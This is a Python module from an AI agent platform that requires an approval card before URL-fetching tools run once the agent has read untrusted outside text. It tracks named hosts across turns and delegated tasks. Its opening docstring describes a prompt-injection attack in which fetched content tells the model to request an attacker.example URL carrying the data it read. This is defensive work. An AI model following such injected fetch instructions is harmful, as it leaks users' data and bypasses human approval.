"""A fetch after outside text asks -- narrowly (2026-11-11, the owner's decision).

``read_url``, ``crawl_site`` and ``web_search`` are read tier: no card. Once a
turn has read text from outside -- a web page, search results, a mail, a
document, an MCP resource: any tool output that reached the model inside a
data fence (``prompt_fence.fence_untrusted``) -- that text can tell the model
to fetch ``https://attacker.example/?d=<what it read>``, and the fetch sends
the data out in its URL.

So after outside text, a call that fetches a URL asks for approval, ONLY when
the URL's host was named neither in the user's own message (the latest user
message; a swarm task's text) nor in a search result returned earlier in the
same turn, and is not this site (``KAZMA_PUBLIC_URL``). Everything else is
as before: a research turn that reads what it searched for stays card-free.
YOLO and standing grants skip it like any other card; it is an ordinary
one-time card whose note says why (``safety.card_notes``, ``outside_fetch``).

This module is the one decision, asked by both chokes:

* the chat graph's approval split (``agent/graph_tool_worker.py``), with the
  turn's :class:`OutsideText` in the declared ``SupervisorState.outside_text``
  (kept across an approval pause, reset on a fresh turn by the supervisor);
* ``LocalToolRegistry.execute`` for a swarm task or the IDE: the task binds a
  tracker (:func:`outside_text_scope`), the registry asks before the bus check
  and records each result after it ran.

:data:`FETCH_URL_FIELDS` names every tool that fetches a URL argument, and
:data:`NOT_FETCHES` every registered tool with a URL-like parameter that
fetches nothing on its own; ``tests/test_outside_text_fetch.py`` fails on a
registered tool in neither.

What counts as read (2026-11-15):

* a data fence in a tool's result, or in the user's message (an attached
  document), as before;
* a call that fetched an outside address and ran, whatever it returned: a
  receipt (``read_url_to_file``, a crawl's save, a Knowledge ingest) shows the
  model none of the page, but the page is now on disk or in a library the
  turn can read back by other means. The tools that read outside content with
  no address argument are :data:`READS_OUTSIDE`;
* at a turn's start, a fence the kept history still holds: an earlier turn's
  tool result or a user message quoting a document
  (:func:`_messages_hold_outside_text`), and the Knowledge Library's block
  (crawled pages) where the supervisor injects it. Kazma's own system notes
  -- memory recall, the Soul, the IDE's open file -- do not count: they are
  what the user and Kazma said, and a card on every turn that recalls
  something would stop meaning anything. What the kept history named (the
  user's earlier messages, its searches' results) stays named
  (:func:`_history_named_hosts`): a follow-up turn may open them.

A task a turn starts carries the turn's state (:func:`delegation_state`): a
sub-agent's goal, a swarm task's prompt, a handoff's task, a scheduled task's
stored prompt are the MODEL's words, so after outside text they never stand
in for the user's. The task starts having read outside text, and only the
hosts the real user named (the delegating turn's latest message) count as
named (``OutsideText.user_hosts``). :data:`DELEGATIONS` names every tool that
starts such a task and how it carries the state.
"""

from __future__ import annotations

import contextlib
import contextvars
import os
import re
from collections.abc import Iterator
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit

__all__ = [
    "DELEGATIONS",
    "FETCH_URL_FIELDS",
    "NOT_FETCHES",
    "NOT_READS_OUTSIDE",
    "READS_OUTSIDE",
    "SEARCH_TOOLS",
    "OutsideText",
    "bound_tracker",
    "delegation_state",
    "fetch_needs_card",
    "outside_text_at_turn_start",
    "outside_text_from_history",
    "outside_text_scope",
    "record_registry_result",
    "registry_card_host",
    "turn_scope",
]

#: Tool -> the arguments that hold the URL it fetches.
FETCH_URL_FIELDS: dict[str, tuple[str, ...]] = {
    "read_url": ("url",),
    "download_image": ("url",),
    "read_url_to_file": ("url",),
    "crawl_page": ("url",),
    "crawl_site": ("start_url",),
    "knowledge_ingest_url": ("url",),
    "knowledge_ingest_site": ("seed_url",),
    # A local path, or an http(s) URL it downloads.
    "analyze_image": ("image_path",),
    "browser_navigate": ("url",),
    "computer_use": ("url",),
}

#: Registered tools with a URL-like parameter that fetch nothing themselves.
NOT_FETCHES: dict[str, str] = {
    "knowledge_create_library": "stores the seed URL; knowledge_ingest_* fetch it",
    "mcp_read_resource": "reads a resource the named MCP server serves, by its URI",
    "inspect_db_schema": "opens a database the operator's tools may reach (database_client's own rules)",
    "execute_db_query": "opens a database the operator's tools may reach (database_client's own rules)",
    "install_agent_skill": "danger tier: always asks, from GitHub or a local folder",
    "analyze_local_image": "reads a local image file",
    "convert_document": "converts a local file",
    "generate_pdf": "renders local content and images",
    "document_search": "searches a Knowledge library already stored",
    # The browser's other tools act on the page browser_navigate opened (each
    # of click, form and script is danger tier: it asks anyway).
    "browser_click": "acts on the open page; danger tier",
    "browser_fill_form": "acts on the open page; danger tier",
    "browser_eval_js": "acts on the open page; danger tier",
    "browser_extract_text": "reads the open page",
    "browser_screenshot": "captures the open page",
    "x_download_media": "downloads a post's media from X's own media hosts, by post id",
}

#: Tools that read outside content with no address argument of their own: a
#: call that ran marks the turn as having read outside text whatever it
#: returned (a FETCH_URL_FIELDS tool marks it when it fetched an address).
#: ``tests/test_outside_text_delegation.py`` finds every registered tool whose
#: code calls an acquisition entry point and fails on one in neither table
#: nor :data:`NOT_READS_OUTSIDE`.
READS_OUTSIDE: dict[str, str] = {
    "x_download_media": "saves a post's media from X in the workspace",
    "run_research_pipeline": "reads the pages its searches found and saves them",
    "start_deep_research": "a background research run: reads and saves pages",
}

#: Registered tools whose code names an acquisition entry point and reads
#: no outside content themselves.
NOT_READS_OUTSIDE: dict[str, str] = {
    "plan_research_queries": "plans queries; names run_research_pipeline in its text only",
    "list_research_papers": "lists saved research runs (local state)",
}

#: Tool -> how a task it starts carries the turn's outside-text state
#: (:func:`delegation_state`). A tool whose side-effect profile is a
#: delegation, or that books a task the agent runs later, is named here
#: (``tests/test_outside_text_delegation.py``).
DELEGATIONS: dict[str, str] = {
    "spawn_agent": "agent.sub_agent.SubAgentManager.spawn: the child graph's initial state",
    "spawn_agents": "agent.sub_agent.SubAgentManager.spawn, once per task",
    "dispatch_swarm": "the task's metadata; swarm.worker_dispatch binds it around the worker",
    "handoff_to_worker": "swarm.handoff.HandoffRequest; the engine puts it on the target's context",
    "schedule_task": "the job's outside_text column; cron.scheduler starts the fired turn with it",
    "edit_scheduled": "a prompt the agent rewrites takes the turn's state, as schedule_task",
    "cancel_scheduled": "cancels a job; starts no task",
    "start_deep_research": "starts no agent: reads only its own searches' results (READS_OUTSIDE)",
    "install_agent_skill": "danger tier: always asks; starts no task",
    "uninstall_agent_skill": "removes a skill; starts no task",
}

#: Tools whose results are search results: their addresses are seen.
SEARCH_TOOLS = frozenset({"web_search", "web_search_duckduckgo"})

#: An MCP tool's argument names that hold an address it fetches.
_MCP_URL_ARGUMENTS = frozenset({"url", "uri", "href", "link", "endpoint", "address"})

_URL_IN_TEXT = re.compile(r"https?://[^\s<>\"'()\[\]]+", re.I)
# A bare host: labels of letters, digits and hyphens, a letter TLD.
_BARE_HOST = re.compile(
    r"(?<![\w@./-])((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24})(?=[/:\s,;!?)\]]|$|\.(?:\s|$))",
    re.I,
)
#: Hosts kept per turn (search results).
_MAX_HOSTS = 500


def _normal(host: str) -> str:
    host = (host or "").strip().lower().rstrip(".")
    return host[4:] if host.startswith("www.") else host


def _host_of(value: str) -> str:
    text = (value or "").strip()
    if not text:
        return ""
    if "://" not in text:
        if not _BARE_HOST.match(text):
            return ""
        text = "https://" + text
    try:
        return _normal(urlsplit(text).hostname or "")
    except ValueError:
        return ""


def _named_hosts(text: str | None) -> set[str]:
    """The hosts a message names: its URLs' hosts and bare host names."""
    body = str(text or "")
    hosts = {_host_of(m.group(0)) for m in _URL_IN_TEXT.finditer(body)}
    hosts |= {_normal(m.group(1)) for m in _BARE_HOST.finditer(body)}
    hosts.discard("")
    return hosts


def _own_hosts() -> set[str]:
    """This site: the install's public address."""
    host = _host_of(os.environ.get("KAZMA_PUBLIC_URL") or "")
    return {host} if host else set()


def _fetch_hosts(tool: str, args: Any) -> list[str]:
    """The URLs a call fetches, as written (``[]`` for a call that fetches none)."""
    if not isinstance(args, dict):
        return []
    if tool.startswith("mcp__"):
        names = [k for k in args if str(k).lower() in _MCP_URL_ARGUMENTS]
    else:
        names = list(FETCH_URL_FIELDS.get(tool, ()))
    out: list[str] = []
    for name in names:
        value = args.get(name)
        if not isinstance(value, str) or not value.strip():
            continue
        text = value.strip()
        if tool == "analyze_image" and not text.lower().startswith(("http://", "https://")):
            continue  # a local file
        if "://" in text or _BARE_HOST.match(text):
            out.append(text)
    return out


def _covered(host: str, allowed: set[str]) -> bool:
    return any(host == a or host.endswith("." + a) for a in allowed if a)


def _result_is_outside_text(content: Any) -> bool:
    """Whether a tool's result carried outside text: a data fence, which only
    the fence helpers write (a fetched page, a mail, an MCP resource...)."""
    from kazma_core.safety.prompt_fence import holds_fence

    return holds_fence(str(content or ""))


def _search_result_hosts(content: Any) -> set[str]:
    """The hosts of a search tool's result links."""
    from kazma_core.safety.prompt_fence import observation_text
    from kazma_core.web_acquire.serp import extract_urls_from_search

    text = observation_text(str(content or ""))
    return {h for h in (_host_of(u) for u in extract_urls_from_search(text)) if h}


def _host_set(values: Any) -> set[str]:
    return {_normal(str(h)) for h in (values or []) if str(h).strip()}


@dataclass
class OutsideText:
    """What a turn (or a swarm task) has read: outside text or not, and the
    hosts named besides the user's latest message (its search results, and
    what the kept history named: :func:`_history_named_hosts`). ``as_state`` /
    ``from_state`` are the checkpointed form (``SupervisorState.outside_text``).

    ``user_hosts`` is set on a task another turn started after outside text
    (:func:`delegation_state`): the hosts the real user named. Its own user
    message is then the delegating model's words, never the user's. None: the
    task's or turn's own user message is the user's.
    """

    read: bool = False
    hosts: set[str] = field(default_factory=set)
    user_hosts: set[str] | None = None

    @classmethod
    def from_state(cls, value: Any) -> OutsideText:
        if not isinstance(value, dict):
            return cls()
        user = value.get("user_hosts")
        return cls(read=bool(value.get("read")), hosts=_host_set(value.get("hosts")),
                   user_hosts=_host_set(user) if isinstance(user, (list, tuple, set)) else None)

    @property
    def delegated(self) -> bool:
        return self.user_hosts is not None

    def as_state(self) -> dict[str, Any]:
        out: dict[str, Any] = {"read": self.read, "hosts": sorted(self.hosts)[:_MAX_HOSTS]}
        if self.user_hosts is not None:
            out["user_hosts"] = sorted(self.user_hosts)[:_MAX_HOSTS]
        return out

    def copy(self) -> OutsideText:
        return OutsideText(read=self.read, hosts=set(self.hosts),
                           user_hosts=None if self.user_hosts is None else set(self.user_hosts))

    def record(self, tool: str, content: Any, *, is_error: bool = False, args: Any = None) -> None:
        """Take one finished call's result into account: any data fence is
        outside text read (an error page quoted whole too); a call that ran
        and fetched an outside address, or a tool of :data:`READS_OUTSIDE`,
        read outside text whatever it returned (a receipt); only a search that
        answered names its hosts."""
        if _result_is_outside_text(content):
            self.read = True
        if is_error:
            return
        if tool in READS_OUTSIDE or _fetch_hosts(tool, args):
            self.read = True
        if tool in SEARCH_TOOLS:
            self.hosts |= _search_result_hosts(content)
            if len(self.hosts) > _MAX_HOSTS:
                self.hosts = set(sorted(self.hosts)[:_MAX_HOSTS])


def _user_named(seen: OutsideText, user_text: str | None) -> set[str]:
    """The hosts the user named: a delegated task's carried set, else the
    user's message outside its fences."""
    from kazma_core.safety.prompt_fence import outside_fences

    if seen.user_hosts is not None:
        return set(seen.user_hosts)
    return _named_hosts(outside_fences(user_text))


def fetch_needs_card(tool: str, args: Any, seen: OutsideText, user_text: str | None) -> str:
    """The host to name on a card when this call must ask; ``""`` when it
    need not: no outside text yet, a call that fetches nothing, or every host
    it fetches named by the user, a search result or this site.

    *user_text* is the user's latest message (a swarm task's text). What it
    quotes inside a data fence -- an attached document's text, an earlier
    worker's output -- is outside text: it counts as read, and the hosts it
    names are not the user's. On a delegated task (``seen.user_hosts`` set)
    the hosts the real user named stand in for it.
    """
    if not (seen.read or _result_is_outside_text(user_text)):
        return ""
    targets = _fetch_hosts(tool, args)
    if not targets:
        return ""
    allowed = _user_named(seen, user_text) | seen.hosts | _own_hosts()
    for target in targets:
        host = _host_of(target)
        if not host:
            return target[:200]  # an address with no host the rules can read asks
        if not _covered(host, allowed):
            return host
    return ""


# ── a swarm task's or an IDE call's turn (the registry path) ───────────────


@dataclass
class _Tracker:
    task_text: str
    seen: OutsideText = field(default_factory=OutsideText)


_TRACKER: contextvars.ContextVar[_Tracker | None] = contextvars.ContextVar(
    "kazma_outside_text_tracker", default=None,
)


@contextlib.contextmanager
def outside_text_scope(task_text: str | None, *, inherited: Any = None,
                       context_text: str | None = None) -> Iterator[None]:
    """Bind a fresh tracker for one swarm dispatch: its prompt is the user's
    message (the outside text it quotes inside a fence -- an earlier worker's
    output -- counts as read; ``fetch_needs_card``).

    *inherited* is the state a delegating turn carried onto the task
    (:func:`delegation_state`, in the task's metadata): the task then starts
    having read outside text, with the real user's hosts. A fence in the
    task's *context_text* is outside text read too."""
    seen = OutsideText.from_state(inherited) if inherited else OutsideText()
    if _result_is_outside_text(context_text):
        seen.read = True
    token = _TRACKER.set(_Tracker(task_text=str(task_text or ""), seen=seen))
    # The innermost scope is the caller's turn: a swarm task a chat turn
    # dispatched runs in a copy of that turn's context, and its own reads
    # (not the chat turn's) are what a task it starts must carry.
    turn = _TURN.set(None)
    try:
        yield
    finally:
        _TURN.reset(turn)
        _TRACKER.reset(token)


def bound_tracker() -> _Tracker | None:
    """The tracker of the task this call runs in, or None (none bound)."""
    return _TRACKER.get()


def registry_card_host(tool: str, args: Any) -> str:
    """For ``LocalToolRegistry.execute``: the host to name on the bus card
    when this call must ask, else ``""`` (no task bound, or no need)."""
    tracker = bound_tracker()
    if tracker is None:
        return ""
    return fetch_needs_card(tool, args, tracker.seen, tracker.task_text)


def record_registry_result(tool: str, payload: Any, args: Any = None) -> None:
    """For ``LocalToolRegistry.execute``: take a finished call into the bound
    task's account (none bound: nothing to do)."""
    tracker = bound_tracker()
    if tracker is None or not isinstance(payload, dict):
        return
    tracker.seen.record(tool, payload.get("content"), is_error=bool(payload.get("is_error")),
                        args=args)


# ── a chat turn's state, for the tasks its calls start ─────────────────────


_TURN: contextvars.ContextVar[tuple[OutsideText, str] | None] = contextvars.ContextVar(
    "kazma_outside_text_turn", default=None,
)


@contextlib.contextmanager
def turn_scope(seen: OutsideText, user_text: str | None) -> Iterator[None]:
    """Bound by the chat graph's tool worker around one call: what the turn
    had read when the model wrote the call, and the user's latest message.
    :func:`delegation_state` reads it."""
    token = _TURN.set((seen.copy(), str(user_text or "")))
    try:
        yield
    finally:
        _TURN.reset(token)


def delegation_state() -> dict[str, Any] | None:
    """The outside-text state a task started by this call must begin with, or
    None when the calling turn read no outside text (the task's own text may
    then stand for the user's, as before).

    The calling turn is the chat graph's (:func:`turn_scope`), else the swarm
    task or IDE call the registry is running (:func:`outside_text_scope`).
    The task starts having read outside text; the hosts the real user named
    (a delegated caller's own carried set, kept across hops) and the hosts the
    turn's searches returned count as named; nothing the delegating model
    wrote does."""
    turn = _TURN.get()
    if turn is not None:
        seen, user_text = turn
    else:
        tracker = bound_tracker()
        if tracker is None:
            return None
        seen, user_text = tracker.seen, tracker.task_text
    if not (seen.read or _result_is_outside_text(user_text)):
        return None
    return OutsideText(read=True, hosts=set(seen.hosts),
                       user_hosts=_user_named(seen, user_text)).as_state()


# ── a turn's start ──────────────────────────────────────────────────────────


def _role_and_text(message: Any) -> tuple[str, str]:
    if isinstance(message, dict):
        role, content = str(message.get("role") or ""), message.get("content")
    else:
        role = str(getattr(message, "role", None) or getattr(message, "type", None) or "")
        content = getattr(message, "content", None)
    if isinstance(content, list):
        content = " ".join(str(p.get("text", "")) for p in content
                           if isinstance(p, dict) and p.get("type") == "text")
    return role, str(content or "")


def _messages_hold_outside_text(messages: Any) -> bool:
    """Whether the messages kept for a call carry outside text: a tool result
    or a user message (a quoted document) holding a data fence. System notes
    are Kazma's own and do not count here (the module docstring says why);
    the supervisor counts the Knowledge block where it injects it."""
    for message in messages or ():
        role, text = _role_and_text(message)
        if role in ("tool", "user", "human") and _result_is_outside_text(text):
            return True
    return False


def _call_names(message: Any) -> dict[str, str]:
    """An assistant message's tool calls: id -> tool name."""
    calls = message.get("tool_calls") if isinstance(message, dict) else getattr(message, "tool_calls", None)
    out: dict[str, str] = {}
    for call in calls or ():
        if not isinstance(call, dict):
            continue
        name = call.get("name") or (call.get("function") or {}).get("name")
        if call.get("id") and name:
            out[str(call["id"])] = str(name)
    return out


def _history_named_hosts(messages: Any, *, users: bool = True) -> set[str]:
    """The hosts the kept history named as a turn's own would: the user's
    messages (outside their fences; *users*) and the results of its searches.
    A delegated task's user message is the delegating model's words: its
    supervisor passes ``users=False``."""
    names: dict[str, str] = {}
    hosts: set[str] = set()
    for message in messages or ():
        role, text = _role_and_text(message)
        if role == "assistant":
            names.update(_call_names(message))
        elif role in ("user", "human") and users:
            from kazma_core.safety.prompt_fence import outside_fences

            hosts |= _named_hosts(outside_fences(text))
        elif role == "tool":
            call_id = message.get("tool_call_id") if isinstance(message, dict) else None
            if names.get(str(call_id or "")) in SEARCH_TOOLS:
                hosts |= _search_result_hosts(text)
    return hosts


def outside_text_from_history(state: Any, messages: Any, *, knowledge_block: bool = False) -> dict[str, Any]:
    """A turn's state once its call's messages are final (the supervisor, at
    iteration 0, after the stub and the trim): read when they still hold an
    earlier turn's page (:func:`_messages_hold_outside_text`) or the Knowledge
    Library's block was injected; the hosts the kept history named stand as
    named, as they did in the turn that named them."""
    seen = OutsideText.from_state(state)
    if knowledge_block or _messages_hold_outside_text(messages):
        seen.read = True
    seen.hosts |= _history_named_hosts(messages, users=not seen.delegated)
    if len(seen.hosts) > _MAX_HOSTS:
        seen.hosts = set(sorted(seen.hosts)[:_MAX_HOSTS])
    return seen.as_state()


def outside_text_at_turn_start(previous: Any, messages: Any, *, continuing: bool = False) -> dict[str, Any]:
    """The state a turn starts with (the supervisor, at iteration 0).

    A fresh turn starts with nothing read, except that the history it keeps
    may still hold an earlier turn's pages (a fence: :func:`_messages_hold_outside_text`).
    A delegated task's carried state is kept (it was given at the task's
    start, never left by an earlier turn), and so is the turn's own state when
    a long mission continues in a new wave (*continuing*)."""
    prior = OutsideText.from_state(previous)
    seen = prior if (continuing or prior.delegated) else OutsideText()
    if _messages_hold_outside_text(messages):
        seen.read = True
    return seen.as_state()
